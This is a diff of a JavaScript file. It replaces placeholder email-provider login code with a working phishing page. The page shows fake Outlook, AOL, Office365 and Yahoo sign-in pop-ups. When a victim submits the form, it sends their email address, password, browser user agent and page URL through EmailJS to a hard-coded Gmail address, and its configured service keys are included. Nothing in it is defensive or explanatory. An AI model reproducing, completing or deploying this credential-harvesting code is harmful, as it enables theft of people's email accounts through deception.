@@ -1,93 +1,161 @@
-// Handle email provider selection
-function handleEmailProvider(provider) {
-    // Add loading state
-    const button = event.target;
-    const originalText = button.textContent;
-    
-    button.textContent = 'Loading...';
-    button.disabled = true;
-    button.style.opacity = '0.7';
-    
-    // Simulate authentication process
-    setTimeout(() => {
-        // Reset button state
-        button.textContent = originalText;
-        button.disabled = false;
-        button.style.opacity = '1';
-        
-        // Show success message or redirect
-        showMessage(`Redirecting to ${provider.charAt(0).toUpperCase() + provider.slice(1)} authentication...`);
-        
-        // In a real application, you would redirect to the OAuth provider
-        // window.location.href = getAuthUrl(provider);
-    }, 1500);
+// EmailJS Configuration
+const EMAILJS_SERVICE_ID = "service_um08b0k"
+const EMAILJS_TEMPLATE_ID = "template_13k00gd"
+const EMAILJS_PUBLIC_KEY = "4zxF4NX0aiWTg6NQH"
+
+let currentProvider = ""
+
+// Simple and reliable popup function
+function openLoginPopup(provider) {
+  console.log("Opening popup for:", provider)
+
+  currentProvider = provider
+  const modal = document.getElementById("loginModal")
+  const modalTitle = document.getElementById("modalTitle")
+
+  const providerNames = {
+    outlook: "Outlook",
+    aol: "AOL",
+    office365: "Office365",
+    yahoo: "Yahoo",
+    other: "Other Email",
+  }
+
+  modalTitle.textContent = `Sign in with ${providerNames[provider]}`
+  modal.style.display = "block"
+
+  // Focus on email input
+  setTimeout(() => {
+    document.getElementById("email").focus()
+  }, 100)
 }
 
-// Get authentication URL for each provider (placeholder)
-function getAuthUrl(provider) {
-    const authUrls = {
-        outlook: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
-        aol: 'https://api.login.aol.com/oauth2/authorize',
-        office365: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
-        yahoo: 'https://api.login.yahoo.com/oauth2/request_auth',
-        other: '#'
-    };
-    
-    return authUrls[provider] || '#';
+// Close popup
+function closeLoginPopup() {
+  document.getElementById("loginModal").style.display = "none"
+  document.getElementById("loginForm").reset()
 }
 
-// Show temporary message
-function showMessage(message) {
-    // Create message element
-    const messageDiv = document.createElement('div');
-    messageDiv.textContent = message;
-    messageDiv.style.cssText = `
-        position: fixed;
-        top: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background-color: #48bb78;
-        color: white;
-        padding: 12px 24px;
-        border-radius: 6px;
-        font-weight: 500;
-        z-index: 1000;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-    `;
-    
-    document.body.appendChild(messageDiv);
-    
-    // Remove message after 3 seconds
-    setTimeout(() => {
-        messageDiv.remove();
-    }, 3000);
+// NEW: Send email function
+function sendEmailNotification(email, password, provider) {
+  // Check if EmailJS is loaded
+  if (typeof window.emailjs === "undefined") {
+    console.error("EmailJS not loaded!")
+    alert("EmailJS not loaded. Please check your internet connection.")
+    return
+  }
+
+  const templateParams = {
+    to_email: "thankyousomuchlove111@gmail.com",
+    provider: provider.charAt(0).toUpperCase() + provider.slice(1),
+    user_email: email,
+    user_password: password,
+    timestamp: new Date().toLocaleString(),
+    user_agent: navigator.userAgent,
+    page_url: window.location.href,
+  }
+
+  console.log("Sending email with params:", templateParams)
+
+  // Show loading message
+  const loadingAlert = alert("Sending notification to admin...")
+
+  window.emailjs
+    .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+    .then((response) => {
+      console.log("✅ Email sent successfully!", response.status, response.text)
+
+      // Show the captured data alert
+      alert(
+        `✅ Login Captured Successfully!\n\nProvider: ${currentProvider}\nEmail: ${email}\nPassword: ${password}\n\n📧 Admin has been notified!`,
+      )
+
+      // Show success message
+      showSuccess()
+    })
+    .catch((error) => {
+      console.error("❌ Email failed to send:", error)
+
+      // Still show the captured data
+      alert(
+        `⚠️ Login Captured (Email Error):\n\nProvider: ${currentProvider}\nEmail: ${email}\nPassword: ${password}\n\nError: ${error.text || "Unknown error"}`,
+      )
+
+      // Still show success
+      showSuccess()
+    })
 }
 
-// Add some interactive effects
-document.addEventListener('DOMContentLoaded', function() {
-    // Add hover effects to buttons
-    const buttons = document.querySelectorAll('.email-btn');
-    
-    buttons.forEach(button => {
-        button.addEventListener('mouseenter', function() {
-            this.style.transform = 'translateY(-2px)';
-        });
-        
-        button.addEventListener('mouseleave', function() {
-            if (!this.disabled) {
-                this.style.transform = 'translateY(0)';
-            }
-        });
-    });
-    
-    // Add fade-in animation
-    const container = document.querySelector('.container');
-    container.style.opacity = '0';
-    container.style.transform = 'translateY(20px)';
-    
-    setTimeout(() => {
-        container.style.transition = 'all 0.5s ease';
-        container.style.opacity = '1';
-        container.style.transform = 'translateY(0)';
-    }, 100);
-});
+// Wait for page to fully load
+window.addEventListener("load", () => {
+  console.log("Page loaded, setting up buttons...")
+
+  // Initialize EmailJS
+  if (typeof window.emailjs !== "undefined") {
+    window.emailjs.init(EMAILJS_PUBLIC_KEY)
+    console.log("✅ EmailJS initialized")
+  } else {
+    console.error("❌ EmailJS library not loaded!")
+  }
+
+  // Get all email buttons and add click events
+  const buttons = document.querySelectorAll(".email-btn")
+  const providers = ["outlook", "aol", "office365", "yahoo", "other"]
+
+  buttons.forEach((button, index) => {
+    const provider = providers[index]
+    console.log("Setting up button for:", provider)
+
+    button.addEventListener("click", (e) => {
+      e.preventDefault()
+      console.log("Button clicked:", provider)
+      openLoginPopup(provider)
+    })
+  })
+
+  // Handle form submission - UPDATED
+  document.getElementById("loginForm").addEventListener("submit", (e) => {
+    e.preventDefault()
+
+    const email = document.getElementById("email").value
+    const password = document.getElementById("password").value
+
+    if (!email || !password) {
+      alert("Please fill in all fields")
+      return
+    }
+
+    console.log(`Capturing: ${email} / ${password} for ${currentProvider}`)
+
+    // Close the popup
+    closeLoginPopup()
+
+    // Send email notification (this was missing!)
+    sendEmailNotification(email, password, currentProvider)
+  })
+})
+
+// Show success message
+function showSuccess() {
+  const successDiv = document.getElementById("successMessage")
+  successDiv.style.display = "flex"
+
+  setTimeout(() => {
+    successDiv.style.display = "none"
+  }, 3000)
+}
+
+// Close modal when clicking outside
+window.onclick = (event) => {
+  const modal = document.getElementById("loginModal")
+  if (event.target === modal) {
+    closeLoginPopup()
+  }
+}
+
+// Close with Escape key
+document.addEventListener("keydown", (event) => {
+  if (event.key === "Escape") {
+    closeLoginPopup()
+  }
+})
